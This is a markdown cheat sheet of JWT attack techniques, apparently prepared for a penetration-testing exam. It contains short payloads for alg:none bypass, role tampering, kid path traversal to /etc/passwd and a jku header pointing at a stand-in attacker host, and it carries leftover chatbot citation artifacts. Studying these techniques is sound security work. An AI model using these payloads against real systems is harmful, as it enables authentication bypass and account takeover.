

---

``md
> [!ABSTRACT]
> JSON Web Tokens (JWT) are used for **authentication and authorization**, allowing users to access resources without storing sessions on the server.  
> 
> A JWT has 3 parts:
> - Header (algorithm)
> - Payload (user data)
> - Signature (verification)  
> 
> Vulnerabilities occur when JWTs are **not properly verified or securely implemented**, allowing attackers to **forge or manipulate tokens**. :contentReference[oaicite:0]{index=0}  
> 
> Common issues:
> - Weak secrets (brute force)  
> - `alg: none` bypass  
> - Missing signature verification  
> - Token tampering  
> 
> Impact:
> - Authentication bypass  
> - Privilege escalation  
> - Full account takeover :contentReference[oaicite:1]{index=1}  
> 
> 🧠 Think: “If you control the token → you control the session”

---

## 🧠 JWT – Cheat Sheet

---

### 🎯 1. Basic Detection (JWT Presence)

> [!CHECK]
> Identify JWT in requests (Authorization header / cookie)  

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
````

---

### 🧪 2. Decode JWT

> [!CHECK]  
> Decode token to inspect payload (Base64)

```bash
header.payload.signature
```

---

### 🧬 3. Modify Payload (Privilege Escalation)

> [!SUCCESS]  
> Change user role or ID

```json
{"username":"admin","role":"admin"}
```

---

### 🧩 4. None Algorithm Attack

> [!SUCCESS]  
> Remove signature verification

```json
{"alg":"none"}
```

```bash
header.payload.
```

---

### 🧪 5. Weak Secret Brute Force

> [!SUCCESS]  
> Crack secret and forge token

```bash
jwt_secret=1234
```

---

### 💥 6. Signature Verification Bypass

> [!SUCCESS]  
> Modify payload if verification is missing

```json
{"user":"admin","isAdmin":true}
```

---

### ⚙️ 7. HS256 ↔ RS256 Confusion

> [!ATTENTION]  
> Trick server into using public key as secret

```json
{"alg":"HS256"}
```

---

### 🧪 8. JWT Replay Attack

> [!SUCCESS]  
> Reuse stolen token

```http
Authorization: Bearer stolen_token
```

---

### 💣 9. Header Injection (kid / jku)

> [!ATTENTION]  
> Inject malicious key reference

```json
{"kid":"../../../../etc/passwd"}
```

```json
{"jku":"http://attacker.com/jwks.json"}
```

---

### 🧪 10. Expiration / Validation Bypass

> [!ATTENTION]  
> Use expired or missing claims

```json
{"exp":9999999999}
```

---

### 🔍 11. Real Workflow (Operator Method)

> [!SUCCESS]

1. Capture token:
    

```http
Authorization: Bearer ...
```

2. Decode:
    

```bash
header.payload.signature
```

3. Modify payload:
    

```json
{"role":"admin"}
```

4. Try bypass:
    

```json
{"alg":"none"}
```

5. Re-sign or remove signature
    
6. Send request → check access
    

---

### 🧠 12. Where to Test

> [!ABSTRACT]

- Authorization headers
    
- Cookies
    
- API authentication
    
- Mobile apps
    
- SPA backends
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
Authorization: Bearer token
header.payload.signature

{"alg":"none"}
header.payload.

{"role":"admin"}
{"username":"admin","isAdmin":true}
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Signature properly verified
>     
> - Strong secret used
>     
> - Claims validated
>     

---

> [!ATTENTION]  
> JWT attacks depend on:
> 
> - Weak implementation
>     
> - Missing verification
>     
> 
> Key attacks:
> 
> - None algorithm
>     
> - Weak secret
>     
> - Token tampering
>     
> 
> No trust issue → no exploit

---

```

---

## 🔥 Key Insight (VERY IMPORTANT)

- JWT is:
  - ❌ Not encrypted by default (payload is readable)  
  - ✅ Only **signed** (integrity, not secrecy) :contentReference[oaicite:2]{index=2}  
- Most real-world bugs:
  - Misconfigured verification  
  - Weak secrets  

👉 Always think:
**“Can I change the token and still get access?”**

---

Just say 🚀
::contentReference[oaicite:3]{index=3}
```